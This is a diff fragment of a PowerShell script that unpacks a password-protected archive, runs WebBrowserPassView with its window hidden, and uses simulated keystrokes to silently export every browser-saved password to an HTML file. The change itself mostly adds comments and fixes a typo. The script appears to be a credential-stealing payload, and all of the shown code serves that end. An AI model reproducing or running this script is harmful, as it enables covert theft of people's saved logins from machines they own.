@@ -26,19 +26,28 @@ Start-Sleep -Seconds 5
 Expand-Archive -Path $sevenZipZip -DestinationPath '7z'
 
 $sevenZipPath = '.\7z\7za.exe'
-Start-Process -FilePath $sevenZipPath -ArgumentList "e", $wbpvZip, "-p$extractionPassword" -Wait
+$extractionArgs = "e", $wbpvZip, "-p$extractionPassword"
 
+# Extract the zip file using 7-Zip
+Start-Process -FilePath $sevenZipPath -ArgumentList $extractionArgs -Wait
+
+# Start WebBrowserPassView in hidden mode
 Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden
 
+# Load the Windows Forms assembly for SendKeys functionality
 Add-Type -AssemblyName System.Windows.Forms
 
+# Allow time for the application to load
 Start-Sleep -Seconds 3
 
+# Simulate keyboard input to select all and save the file
 [System.Windows.Forms.SendKeys]::SendWait('^a')  # CTRL + A
 [System.Windows.Forms.SendKeys]::SendWait('^s')  # CTRL + S
 
-STart-Sleep -Seconds 1
+# Allow time for the save dialog to appear
+Start-Sleep -Seconds 1
 
+# Specify the filename and navigate to save
 [System.Windows.Forms.SendKeys]::SendWait('export.html')
 [System.Windows.Forms.SendKeys]::SendWait('{TAB}')  # Navigate to the Save button
 [System.Windows.Forms.SendKeys]::SendWait('{ENTER}')  # Press Enter to save
